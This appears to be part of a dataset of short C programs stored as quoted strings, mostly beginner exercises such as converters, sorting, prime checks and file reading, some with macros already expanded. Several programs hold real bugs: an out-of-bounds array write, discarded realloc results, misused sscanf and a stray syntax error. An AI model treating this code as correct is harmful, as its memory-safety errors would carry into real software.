    "#include <stdio.h>\nint acm_icpc(char *p1, char *p2, int len)\n{\n    int ntopics = 0;\n    for (int i = 0; i < len; i++) {\n        if (p1[i] == '1' || p2[i] == '1')\n            ntopics++;\n    }\n    return ntopics;\n}\nint main()\n{\n    int N, M;\n    scanf(\"%d %d\", &N, &M);\n    char skills[N][M];\n    for (int i = 0; i < N; i++) {\n        scanf(\"%s\", skills[i]);\n    }\n    int mtopics = 0;\n    int mteams = 0;\n    int ntopics;\n    for (int i = 0; i < N; i++) {\n        for (int j = i + 1; j < N; j++) {\n            ntopics = acm_icpc(skills[i], skills[j], M);\n            if (ntopics > mtopics) {\n                mtopics = ntopics;\n                mteams = 1;\n                printf(\"Updating: team (%d,%d) = %d skills\\n\",\n                       i, j, ntopics);\n            } else if (ntopics == mtopics) {\n                mteams++;\n                printf(\"Addtl team (%d,%d) found with %d \"\n                       \"skills, teams %d\\n\",\n                       i, j, ntopics, mteams);\n            }\n        }\n    }\n    printf(\"%d\\n%d\\n\", mtopics, mteams);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\nint main(void)\n{\n setlocale(6, \"Portuguese\");\n    int x, escolha, cont;\n    float valor, celciu, fahrenheit, reais, dolares, tes;\n    do\n    {\n            printf(\"Digite o valor em Reais que ir\u00e1 ser convertido:\\n\");\n            scanf(\"%f\", &reais);\n            printf(\"%.2f\\n\", reais);\n            printf(\"Digite o valor do Dolar que vale um Real:\\n\");\n            scanf(\"%f\", &dolares);\n            printf(\"%.2f\\n\", dolares);\n            valor= reais/dolares;\n            printf(\"%.2f\\n\", valor);\n            printf(\"O valor de %.2f reais em Dolares \u00e9 de %.2f\", reais, valor);\n        printf(\"\\nQuer fazer outra conver\u00e7\u00e3o?(1 para sim / 2 para nao)\\n\");\n        scanf(\"%d\", &cont);\n    } while (cont == 1);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, const char *argv[])\n{\n    char text[100];\n    int a = 0;\n    int A = 0;\n    printf(\"Provide a line of text: \");\n    fgets(text, 100, (stdin));\n    for (int i = 0; i < strlen(text); i++)\n    {\n        if (text[i] == 'a')\n        {\n            a++;\n        }\n        else if (text[i] == 'A')\n        {\n            A++;\n        }\n    }\n    printf(\"%s%i\\n\", \"Number of a: \", a);\n    printf(\"%s%i\\n\", \"Number of A: \", A);\n    return 0;\n}",
    "#include<stdio.h>\nvoid somador();\nvoid divisor(float num1, float num2);\nint fatorial(int n);\nint main() {\n  float x = 15;\n  float y = 5;\n  int xpto = 0;\n  int resultadoFatorial = 0;\n    printf(\"Inicio do programada de soma\\n\");\n    printf(\"Informe um valor para calcular o fatorial: \\n\");\n    scanf(\"%d\", &xpto);\n    resultadoFatorial = fatorial(xpto);\n    printf(\"O resultado: %d\\n\", resultadoFatorial);\n    printf(\"Fim do programa!\\n\");\n    return 0;\n}\nint fatorial(int n) {\n  int resultado = 1;\n  printf(\"Vai calcular o fatorial do n\u00famero %d\\n\", n);\n  while(n > 0) {\n    resultado = resultado * n;\n    n--;\n  }\n  somador();\n  return resultado;\n}\nvoid divisor(float num1, float num2) {\n    float r = num1 / num2;\n    printf(\"A divis\u00e3o de %.2f por %.2f \u00e9 %.2f\\n\", num1, num2, r);\n    return;\n}\nvoid somador() {\n  int num1 = 0;\n  int num2 = 0;\n  int soma1 = 0;\n  printf(\"Oi, eu sou a fun\u00e7\u00e3o somador!\\n\");\n  printf(\"\\nInforme o num1: \\n\");\n  scanf(\"%d\", &num1);\n  printf(\"\\nInforme o num2: \\n\");\n  scanf(\"%d\", &num2);\n  soma1 = num1 + num2;\n  printf(\"Soma de %d e %d \u00e9: %d\\n\", num1, num2, soma1);\n  return;\n}",
    "#include <stdio.h>\n\nvoid input(int arr[], int size) {\n    int i;\n    for(i = 0; i < size; i++){\n        scanf(\"%d\",&arr[i]);\n    }\n}\nvoid queue(int arr[], int size) {\n    int i, j, tmp;\n    for( i = 0; i < size-1; i++) {\n        for( j = 0; j < size-1-i; j++) {\n            if(arr[j] > arr[j+1]) {\n                tmp = arr[j];\n                arr[j] = arr[j+1];\n                arr[j+1] = tmp;\n            }\n        }\n    }\n}\nvoid print(int arr[], int size) {\n    int i;\n    for( i = 0; i < size; i++) {\n        printf(\"%d  \",arr[i]);\n    }\n    printf(\"\\n\");\n}\nint main(void) {\n    int arr[10] = {0};\n    int size;\n    scanf(\"%d\",&size);\n    input(arr,size);\n    queue(arr,size);\n    print(arr,size);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(void){\n    int d1=123;\n    int arr[5];\n    int d2=456;\n    int i;\n    printf(\"d1=%d d2=%d\\n\\n\",d1,d2);\n    for(i=-4;i<=5;i++){\n        arr[i]=i;\n    }\n    printf(\"i=%d, address:%p\\n\",i,&i);\n    int x=5 +4;\n    for(i=-4;i<x;i++){\n        printf(\"arr[%d]=%d, address:%p\\n\",i,arr[i],&arr[i]);\n    }\n    printf(\"\\nd1=%d, address:%p\\n\",d1,&d1);\n    printf(\"d2=%d, address:%p\\n\",d2,&d2);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, const char * argv[])\n{\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nFILE *open_file(char *filename,FILE *fp,char *mode){\n    fp=fopen(filename,mode);\n    if(!fp){\n        printf(\"Unable to open file\\n\");\n        exit(1);\n    }\n    return fp;\n}\nvoid close_file(const char *input,char *filename,FILE *in_fp,FILE *out_fp){\n    fclose(in_fp);\n    fclose(out_fp);\n    remove(input);\n    rename(filename,input);\n}\nvoid process(const char *input){\n    char filename[255]={};\n    char readin[255]={};\n    int line=0;\n    const int Start_line=16;\n    const int End_line=22;\n    FILE *in_fp,*out_fp;\n    strcpy(filename,input);\n    in_fp=open_file(filename,in_fp,\"r\");\n    out_fp=open_file(strcat(filename,\"0\"),out_fp,\"w\");\n    while(!feof(in_fp)){\n        fgets(readin,255,in_fp);\n        line++;\n        if(line<Start_line||line>End_line)\n            fputs(readin,out_fp);\n    }\n    close_file(input,filename,in_fp,out_fp);\n}\nint main(int argc, char **argv){\n    if(argc<2){\n        printf(\"Please specify a file as input\\n\");\n        exit(1);\n    }\n    int file_count=1;\n    while(file_count<argc){\n        process(argv[file_count]);\n        file_count++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint scroll(int array[],int size,int new_value)\n{\n    for(int i=0;i<size-1;i++)\n    {\n        array[i] = array[i+1];\n    }\n    array[size-1] = new_value;\n}\nint sum(int array[],int size)\n{\n    int sum = 0;\n    for(int i=0;i<size;i++)\n    {\n        sum += array[i];\n    }\n    return sum;\n}\nint main(void)\n{\n    FILE *file = fopen(\"d1.txt\",\"r\");\n    int box1[3];\n    fscanf(file,\"%d\",&box1[0]);\n    fscanf(file,\"%d\",&box1[1]);\n    fscanf(file,\"%d\",&box1[2]);\n    int first_sum,second_sum;\n    first_sum = sum(box1,3);\n    int temp;\n    int answer=0;\n    while (!feof(file))\n    {\n        fscanf(file,\"%d\",&temp);\n        scroll(box1,3,temp);\n        second_sum = sum(box1,3);\n        if(first_sum<second_sum) answer++;\n        first_sum = second_sum;\n    }\n    printf(\"%d\",answer);\n}",
    "#include<stdio.h>\nint min_remove = 1000;\nvoid find_min(int A[], int n, int k, int start, int end)\n{\n    if(n - end + start > min_remove)\n        return;\n    if(start==end)\n        return;\n    if(A[end-1]-A[start]<=k)\n    {\n        min_remove = n - end + start;\n        return;\n    }\n    find_min(A, n, k, start+1, end);\n    find_min(A, n, k, start, end-1);\n}\nint main()\n{\n    int n,k;\n    scanf(\"%d\",&n);\n    int A[n];\n    for(int i=0;i<n;i++)\n    {\n        scanf(\"%d\",&A[i]);\n    }\n    scanf(\"%d\",&k);\n    find_min(A, n, k, 0, n);\n    printf(\"%d\",min_remove);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int number, right_digit, sum;\n    printf(\"Enter your number\\n\");\n    scanf(\"%i\", &number);\n    sum = 0;\n    while (number != 0 )\n    {\n        right_digit = number % 10;\n        sum += right_digit;\n        number = number / 10;\n    }\n    printf(\"The sum is : %i\", sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n long int numero;\n printf(\"Digite o numero: \");\n scanf(\"%d\",&numero);\n char string[30];\n sprintf(string,\"%d\",numero);\n int tamanhoString = strlen(string);\n for(int i = tamanhoString; i >= 0; i -= 1) {-\n     printf(\"%c\",string[i]);\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid func(int arr[]){\n    int n = 6;\n    for (int i = 0; i<n ; i++){\n        arr[i] = 2 * arr[i];\n    }\n}\nint main(int argc, char **argv)\n{\n    int n = 10;\n    int arr[n];\n    for (int i = 0; i < n ; i++) {\n        arr[i] = i;\n        printf(\"%d\\t%d\\n\",i,arr[i]);\n    }\n    char word[] = \"hello!\";\n    printf(\"%s\\t\\t%lu\\n\",word,sizeof(word)/sizeof(char));\n    int a[] = {1,2,3,4,5,6};\n    printf(\"%lu\\n\\n\",sizeof(a)/sizeof(int));\n    for (int i = 0; i < sizeof(a)/sizeof(int) ; i++){\n        printf(\"%d\\n\",a[i]);\n    }\n    printf(\"\\\\/\\\\/\\\\/\\n\");\n    func(a);\n    for (int i = 0; i < sizeof(a)/sizeof(int) ; i++){\n        printf(\"%d\\n\",a[i]);\n    }\n    printf(\"\\\\/\\\\/\\\\/\\n\");\n int x = 999;\n int *px = &x;\n printf(\"px address is %p\\n\",&px);\n printf(\"x address is %p\\n\", &x);\n printf(\"px is: %p\\n*px is %d\\n\", px, *px);\n    printf(\"\\n\\\\/\\\\/\\\\/\\n\");\n    long num1 = 0L;\n    long num2 = 0L;\n    long *pnum = ((void*)0);\n    pnum = &num1;\n    *pnum = 2L;\n    ++num2;\n    printf(\"num2 = %ld\\n\",num2);\n    num2 += *pnum;\n    printf(\"num2 = %ld\\n\",num2);\n    pnum = &num2;\n    ++(*pnum);\n    printf(\"num2 = %ld\\n\",num2);\n    printf(\"num1 = %ld, num2 = %ld, *pnum=%ld, *pnum+num2=%ld\\n\",num1,num2,*pnum,*pnum+num2);\n    printf(\"\\n\\\\/\\\\/\\\\/\\n\");\n    int values[100];\n    int *valuesPtr;\n    valuesPtr = values;\n    printf(\"%p\\t%p\\n\",valuesPtr,&values);\n printf(\"%lu\\n\",sizeof(values)/sizeof(int));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint prost(int n)\n{\n    int i;\n    if (n == 1)\n        return 1;\n    for (i = 2; i < n; i++)\n        if (n % i == 0)\n            return 0;\n    return 1;\n}\nvoid izbaci_prost(int niz[], int vel)\n{\n    int i, j;\n    for (i = 0; i < vel; i++)\n    {\n        if (prost(niz[i]) == 1)\n        {\n        for (j = i; j < vel - 1; j++)\n            niz[j] = niz[j+1];\n        i--;\n        vel--;\n    }\n}\n}\nint main()\n{\n    int niz[10] = {1, 11, 5, 4, 7, 2, 3, 8, 13, 41};\n    izbaci_prost(niz, 8);\n    int i;\n    for (i = 0; i < 10; i++)\n        printf(\"%d\", niz[i]);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n char chr;\n scanf(\"%c\",&chr);\n if (chr >= 'a' && chr <= 'z')\n {\n  chr+='A'-'a';\n  printf(\"%c\\n\",chr);\n  return 0;\n }\n if (chr >= 'A' && chr <= 'Z')\n {\n  chr-='A'-'a';\n  printf(\"%c\\n\",chr);\n  return 0;\n }\n printf(\"%d\\n\",chr);\n}",
    "#include <stdio.h>\nvoid isPrime(int number){\n    int isPrime = 0, i;\n    for(i=2 ;i<= (number/2);i++){\n        if((number % i) == 0){\n            isPrime = 1;\n            break;\n        }\n    }\n    if (number == 0 || number == 1) {\n    printf(\"Number (%d) is neither prime nor composite.\\n\", number);\n    } else {\n        if(!isPrime){\n            printf(\"Number (%d) is a Prime number.\\n\", number);\n        } else{\n            printf(\"Number (%d) is not a Prime number.\\n\", number);\n        }\n    }\n}\nvoid isPositive(int number){\n    if(number > 0){\n        printf(\"Number (%d) is a Positive Integer\\n\", number);\n    } else if(number < 0){\n        printf(\"Number (%d) is a Negative Integer\\n\", number);\n    }else{\n        printf(\"Number (%d) is Neutral\\n\", number);\n    }\n}\nvoid isEven(int number){\n    if(number != 0){\n        if((number % 2) == 0){\n            printf(\"Number (%d) is Even Integer\\n\", number);\n        }else{\n            printf(\"Number (%d) is Odd Integer\\n\", number);\n        }\n    }\n}\nint main(){\n    int number[100], n;\n    printf(\"How many integers you want to use?\\n\");\n    scanf(\"%d\", &n);\n    for(int i = 0; i<n; i++){\n        printf(\"Enter number (%d) : \", i+1);\n        scanf(\"%d\", &number[i]);\n        printf(\"\\n\");\n    }\n    for(int i = 0; i<n; i++){\n        isPositive(number[i]);\n        isEven(number[i]);\n        if(number[i] > 0){\n            isPrime(number[i]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n        char phrase[] = \"The show must go on\";\n        char text[10];\n        printf(\"Write the text you want to look for: \");\n        fgets(text, 10, (stdin));\n        if (strstr(phrase, text))\n                printf(\"Found '%s' in '%s'\\n\", text, phrase);\n        else\n                printf(\"'%s' not found in '%s'\\n\", text, phrase);\n        printf(\"Write the text you want to look for: \");\n        scanf(\"%9s\", text);\n        if (strstr(phrase, text))\n                printf(\"Found '%s' in '%s'\\n\", text, phrase);\n        else\n                printf(\"'%s' not found in '%s'\\n\", text, phrase);\n        return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint lengthOfLongestSubstring(char* s) {\n    int Hash[26];\n    memset(Hash,-1,sizeof(int)*26);\n    int len = 0;\n    int maxL = 0;\n    if(sizeof(s) == 0) return 0;\n    for(int i = 0; i < sizeof(s);i++,len++) {\n        if(Hash[s[i]-'a'] >= 0) {\n            maxL = maxL > len ? maxL : len;\n            i = Hash[s[i]-'a']+1;\n            len = 0;\n            memset(Hash,-1,sizeof(int)*26);\n        }\n        Hash[s[i]-'a'] = i;\n    }\n    return maxL > len ? maxL : len;\n}\nint main()\n{\n    printf(\"%d\\n\",lengthOfLongestSubstring(\"abcsdfdsfdsfdsf\"));\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int i;\n    scanf(\"%d\", &i);\n    printf(\"%d\\n\", i);\n    printf(\"%d nota(s) de R$ 100,00\\n\", i/100);\n    i %= 100;\n    printf(\"%d nota(s) de R$ 50,00\\n\", i/50);\n    i %= 50;\n    printf(\"%d nota(s) de R$ 20,00\\n\", i/20);\n    i %= 20;\n    printf(\"%d nota(s) de R$ 10,00\\n\", i/10);\n    i %= 10;\n    printf(\"%d nota(s) de R$ 5,00\\n\", i/5);\n    i %= 5;\n    printf(\"%d nota(s) de R$ 2,00\\n\", i/2);\n    i %= 2;\n    printf(\"%d nota(s) de R$ 1,00\\n\", i);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <string.h>\n\nint a[10], count = 0;\npthread_t thread[10];\npthread_mutex_t lock[10 + 1];\nvoid *sort (void *index);\nvoid *check (void * temp);\nint main()\n{\n    int i;\n    for(i = 0; i < 10; i++)\n        a[i] = i;\n    for(i = 0; i < 10; i++)\n    {\n        if (pthread_mutex_init(&lock[i], ((void*)0)) != 0)\n        {\n            printf(\"\\nMutex init failed\\n\");\n            return 1;\n        }\n    }\n    while(1)\n    {\n        for(i = 1; i < 10; i++)\n        {\n            int ret = pthread_create(&thread[i - 1], ((void*)0), sort, (void *) &i);\n            if (ret != 0)\n                printf(\"\\nCan't create thread :[%s]\", strerror(ret));\n            pthread_join( thread[i], ((void*)0));\n        }\n        int ret = pthread_create(&thread[10 - 1], ((void*)0), check, ((void*)0));\n        if (ret != 0)\n            printf(\"\\nCan't create thread :[%s]\", strerror(ret));\n        pthread_join( thread[10 - 1], ((void*)0));\n        for(i = 0; i < 10 - 1; i++)\n            pthread_join( thread[i], ((void*)0));\n    }\n    for(i = 0; i < 10; i++)\n        pthread_mutex_destroy(&lock[i]);\n    return 0;\n}\nvoid *sort(void *index)\n{\n    int right = *((int *) index), left = right - 1;\n    pthread_mutex_lock(&lock[left]);\n    pthread_mutex_lock(&lock[right]);\n    count++;\n    if((a[left] < a[right]) && (left >= 0) && (right < 10))\n    {\n        int temp = a[left];\n        a[left] = a[right];\n        a[right] = temp;\n    }\n    pthread_mutex_unlock(&lock[right]);\n    pthread_mutex_unlock(&lock[left]);\n    pthread_exit(((void*)0));\n}\nvoid *check (void * temp)\n{\n    pthread_mutex_lock(&lock[10]);\n    for(int i = 0; i < 10 - 1; i++)\n        if(a[i] < a[i + 1])\n            pthread_exit(((void*)0));\n    for(int i = 0; i < 10; i++)\n        printf(\"%d \", a[i]);\n    printf(\"\\n Sorted; Count = %d \\n\", count/10);\n    exit(0);\n    pthread_mutex_unlock(&lock[10]);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdarg.h>\nchar* strinterp_h(int size, const char* fmt, ...) {\n    va_list args;\n    char* buf = malloc(size);\n    __builtin_va_start(args, fmt);\n    int l = vsnprintf(buf, size, fmt, args);\n    __builtin_va_end(args);\n    if (l > size) {\n        l++;\n        buf = realloc(buf, l);\n        __builtin_va_start(args, fmt);\n        vsnprintf(buf, l, fmt, args);\n        __builtin_va_end(args);\n        printf(\"*** %s: size %d too small, resized to %d\\n\", __func__, size, l);\n    }\n    return buf;\n}\n\n\nchar* __strinterp__s(int size, char* buf, const char* fmt, ...) {\n    va_list args;\n    __builtin_va_start(args, fmt);\n    int l = vsnprintf(buf, size, fmt, args);\n    __builtin_va_end(args);\n    if (l > size) printf(\"*** %s: size %d, needed %d\\n\", __func__, size, l);\n    return buf;\n}\nint main() {\n    char* fmt = \"%s is the name of this city with %d people\\n\";\n    char* val = strinterp_h(41, fmt, \"zurche\", 300500);\n    puts(val);\n    puts(__strinterp__s(48, (char[48]) {}, fmt, \"rew\", 4323));\n}",
    "#include <stdio.h>\n\n\n\n\nint main()\n{\n int cc, comment_state, saw_slash, saw_star, string_state;\n string_state = 0;\n comment_state = 0;\n saw_slash = 0;\n saw_star = 0;\n while ((cc = getchar()) != (-1)) {\n  if (comment_state == 0) {\n   if (cc == '/')\n    saw_slash = 1;\n   else if (saw_slash == 1) {\n    if (cc == '*' && string_state == 0) {\n     comment_state = 1;\n    }\n    else {\n     putchar('/');\n     putchar(cc);\n    }\n    saw_slash = 0;\n   }\n   else {\n    putchar(cc);\n   }\n   if (cc == '\"'){\n    if (string_state==0)\n     string_state = 1;\n    else\n     string_state = 0;\n   }\n  }\n  else {\n   if (cc == '*')\n    saw_star = 1;\n   else if (saw_star == 1) {\n    if (cc == '/') {\n     comment_state = 0;\n    }\n    saw_star = 0;\n   }\n  }\n }\n}",
    "#include <stdio.h>\nvoid special(int);\nint main() {\n    int num;\n    printf(\"Enter a number\\n\");\n    scanf(\"%d\",&num);\n    special(num);\n return 0;\n}\nvoid special(int n)\n{\n    int b,s=0,c=0;\n    while(n!=0)\n    {\n        b=n%10;\n        s=s+b;\n        c++;\n        n=n/10;\n    }\n    if(s==c)\n    printf(\"The given number is special\");\n    else\n    printf(\"The given number is not special\");\n}",
    "#include <stdio.h>\n#include <fcntl.h>\n#include <string.h>\nint main()\n{\n FILE *fp;\n int fd;\n char str[100] = \"fdopen test string\\n\";\n fd = open(\"fdopen.txt\", (0x04000000));\n fp = fopen(\"fdopen.txt\", \"w\");\n if (fp == ((void*)0))\n  return -1;\n fwrite(str, strlen(str), 1, fp);\n fclose(fp);\n}",
    "#include <stdio.h>\nunsigned a = 0;\nunsigned c = 1;\nint main(void)\n{\n    unsigned *b = &a;\n    unsigned *d = &c;\n    if (c) {\n        printf(\"Global variable 'a' of value %u at address %p is \", a, b);\n        if (a % 2 == 0)\n            printf(\"even.\\n\");\n        else\n            printf(\"odd.\\n\");\n    } else {\n        printf(\"Global variable 'c' of value %u at address %p is \", c, d);\n        if (c % 2 == 0)\n            printf(\"even.\\n\");\n        else\n            printf(\"odd.\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint roll_n_dice(int dice, int sides);\nint main(void)\n{\n    int sets, sides, dice;\n    srand((unsigned int) time(0));\n    printf(\"Enter the number of sets; enter the q to stop: \");\n    while (scanf(\"%d\", &sets) == 1)\n    {\n        printf(\"How many sides and how many dice? \");\n        while (scanf(\"%d %d\", &sides, &dice) != 2 || sides < 2 || dice < 1)\n        {\n            while (getchar() != '\\n')\n                continue;\n            if (dice < 1)\n                printf(\"You need at least 1 die. \");\n            else if (sides < 2)\n                printf(\"You need at least 2 sides. \");\n            else\n                printf(\"Input isn't match. \");\n            printf(\"Try again with 2 integers: \");\n        }\n        printf(\"Here are %d sets of %d %d-sided throws.\\n\", sets, dice, sides);\n        for (int i = 0; i < sets; i++)\n        {\n            printf(\"%4d\", roll_n_dice(dice, sides));\n            if ((i+1) % 10 == 0 || i+1 == sets)\n                putchar('\\n');\n        }\n        printf(\"How many sets? Enter q to stop: \");\n    }\n    puts(\"Bye.\");\n    return 0;\n}\nint roll_n_dice(int dice, int sides)\n{\n    int total = 0;\n    while (dice--)\n        total += rand() % sides + 1;\n    return total;\n}",
    "#include <stdio.h>\nint main() {\n  char c = getchar();\n  switch (c) {\n  case 'A':\n    printf(\"It was an a\\n\");\n    break;\n  case 'Q':\n    printf(\"It was a q\\n\");\n    break;\n  default:\n    printf(\"It was something else\\n\");\n  }\n  printf(\"Bye now :)\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main(void){\n  float altura,perc;\n  printf(\"Insira sua altura\\n\");\n  scanf(\"%f\",&altura);\n  perc = (72.7*altura) - 58;\n  printf(\"O peso perfeito para sua altura \u00e9: %.2f\\n\",perc);\n  return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <string.h>\nint main() {\n  close(1);\n  int fd = open(\"log.txt\", (0x10000000)|(((__wasi_oflags_t)(1 << 0)) << 12), 0644);\n  char* buffer = \"helloworld\";\n  printf(\"helloworld!\\n\");\n  fflush((stdout));\n  close(fd);\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <stdlib.h>\nchar* datei = \"fileIO.conf\";\nint main(void){\n  FILE *fp;\n  if((fp = fopen(datei, \"r\"))==((void*)0)){\n    printf(\"ERROR: FILE NOT FOUND\\n\" );\n    return -1;\n  }\n  char buf[256];\n  int countA = 0;\n  int countB = 0;\n  int *a;\n  a = (int*) malloc(sizeof(int));\n  int *b;\n  b = (int*) malloc(sizeof(int));\n  char c[20];\n  char d[20];\n  int temp;\n  while(fgets(buf, 256,fp)!=((void*)0)){\n    printf(\"%s\",buf );\n    if(strstr(buf,\"a\")){\n      if(sscanf(buf, \"%s %s %d \", c, d, &temp)!=1){\n        a[countA] = temp;\n        countA++;\n        realloc(a, sizeof(int)*countA);\n        printf(\"Es wurde %d eingelesen\\n\",temp );\n        continue;\n      }\n    }\n    if(strstr(buf,\"b\")){\n      if(sscanf(buf, \"%s %s %d\", &temp)!=1){\n        b[countB] = temp;\n        countB++;\n        realloc(b, sizeof(int)*countB);\n        printf(\"Es wurde %d eingelesen\\n\",temp );\n        continue;\n      }\n    }\n  }\n  printf(\"Array A: \");\n  for(int i = 0; i < countA; i++){\n    printf(\"%d \",a[i]);\n  }\n  printf(\"\\nArray B: \");\n  for(int i = 0; i < countB; i++){\n    printf(\"%d \",b[i]);\n  }\n  free(a);\n  free(b);\n  fclose(fp);\n  return 0;\n}",
    "#include <stdint.h>\nextern void abort (void);\nint main()\n{\n  int i = 1;\n  int *p = &i;\n  uintptr_t iptr;\n  iptr = (uintptr_t)p - (uintptr_t)&iptr;\n  p = (int *)((uintptr_t)&iptr + iptr);\n  if (*p != 1)\n    abort ();\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\ndouble kelvinToCelsius(double kelvin)\n{\n    return kelvin - 273.15;\n}\ndouble celsiusToKelvin(double celsius)\n{\n    return celsius + 273.15;\n}\ndouble kelvinToFahr(double kelvin)\n{\n    return kelvin * 9 / 5 - 459.67;\n}\ndouble celsiusToFahr(double celsius)\n{\n    return kelvinToFahr(celsiusToKelvin(celsius));\n}\ndouble fahrToKelvin(double fahr)\n{\n    return (fahr + 459.67) * 5 / 9;\n}\ndouble fahrToCelsius(double fahr)\n{\n    return kelvinToCelsius(fahrToKelvin(fahr));\n}\nvoid printConversionsFromCelsius(double celsius)\n{\n    printf(\"%.2lfC = %.2lfF = %.2lfK\\n\", celsius, celsiusToFahr(celsius), celsiusToKelvin(celsius));\n}\nvoid printConversionsFromKelvin(double kelvin)\n{\n    printf(\"%.2lfK = %.2lfC = %.2lfF\\n\", kelvin, kelvinToCelsius(kelvin), kelvinToFahr(kelvin));\n}\nvoid printConversionsFromFahr(double fahr)\n{\n    printf(\"%.2lfF= %.2lfC = %.2lfK\\n\", fahr, fahrToCelsius(fahr), fahrToKelvin(fahr));\n}\nint main()\n{\n    double temperature;\n    int parsedNumbers = scanf(\"%lf\", &temperature);\n    if (parsedNumbers == 0) {\n        printf(\"Input error\");\n        exit(0);\n    }\n    printConversionsFromCelsius(temperature);\n    printConversionsFromFahr(temperature);\n    printConversionsFromKelvin(temperature);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n\n printf(\"REG_Base: %s\\n\", \"ebx\");\n\n\n printf(\"REG_Base: %d\\n\", 2);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n    char *s;\n    s = malloc(1024 * sizeof(char));\n    scanf(\"%[^\\n]\", s);\n    s = realloc(s, strlen(s) + 1);\n    for(int i=0;i<strlen(s);i++){\n        if(s[i]==' '){\n            printf(\"\\n\");\n            continue;\n        }\n        printf(\"%c\",s[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int arr[5] = {1, 2, 3, 4, 5};\n    int n;\n    printf(\"Search a number : \");\n    scanf(\"%d\", &n);\n    int s = 0, e = 4;\n    while (s <= e)\n    {\n        int mid = (s + e) / 2;\n        if (n == arr[mid])\n        {\n            printf(\"%d is present at index %d\", n, mid);\n            break;\n        }\n        else if (n < arr[mid])\n        {\n            e = mid - 1;\n        }\n        else\n        {\n            s = mid + 1;\n        }\n    }\n    if (s > e)\n    {\n        printf(\"Element not Found\");\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n    FILE *ptr = fopen(\"4thquestion.txt\", \"r\");\n    int vowels = 0, consonants = 0;\n    char ch;\n    while ((ch = fgetc(ptr)) != (-1))\n    {\n        if (ch == 'a' || ch == 'e' || ch == 'i' || ch == 'o' || ch == 'u' || ch == 'A' || ch == 'E' || ch == 'I' || ch == 'O' || ch == 'U')\n            vowels++;\n        else if (ch >= 'a' && ch <= 'z' || ch >= 'A' && ch <= 'Z')\n            consonants++;\n    }\n    printf(\"The number of vowels are : %d.\", vowels);\n    printf(\"\\n\");\n    printf(\"The number of consonants are : %d.\", consonants);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main () {\n   int i, n;\n   int *a;\n   printf(\"Number of elements to be entered:\");\n   scanf(\"%d\",&n);\n   a = (int*)calloc(n, sizeof(int));\n   printf(\"Enter %d numbers:\\n\",n);\n   for( i=0 ; i < n ; i++ ) {\n      scanf(\"%d\",&a[i]);\n   }\n   printf(\"The numbers entered are: \");\n   for( i=0 ; i < n ; i++ ) {\n      printf(\"%d \",a[i]);\n   }\n   free( a );\n   return(0);\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n    int i, j = 0, k = 0, x, len;\n        char str[100], str1[10][20], temp;\n        printf(\"enter the string :\");\n        scanf(\"%[^\\n]s\", str);\n        for (i = 0;str[i] != '\\0'; i++)\n        {\n            if (str[i] == ' ')\n            {\n                str1[k][j]='\\0';\n                k++;\n                j=0;\n            }\n            else\n            {\n                str1[k][j]=str[i];\n                j++;\n            }\n        }\n        str1[k][j] = '\\0';\n        for (i = 0;i <= k;i++)\n        {\n            len = strlen(str1[i]);\n            for (j = 0, x = len - 1;j < x;j++,x--)\n            {\n                temp = str1[i][j];\n                str1[i][j] = str1[i][x];\n                str1[i][x] = temp;\n            }\n        }\n        for (i = 0;i <= k;i++)\n        {\n            printf(\"%s \", str1[i]);\n        }\n}",
    "#include <stdio.h>\nint main(){\n    int basic_salary;\n    float gross_salary;\n    printf(\"Enter your base salary: \");\n    scanf(\"%d\", &basic_salary);\n    gross_salary = (float)basic_salary + (0.4 * (float)basic_salary) + (0.2 * (float)basic_salary);\n    printf(\"\\nGross Salary: $ %.2f\", gross_salary);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n    puts(\"Listing arguments\\n\");\n    for(int i = 0; i < argc; i++)\n    {\n        puts(argv[i]);\n        putchar('\\n');\n    }\n}",
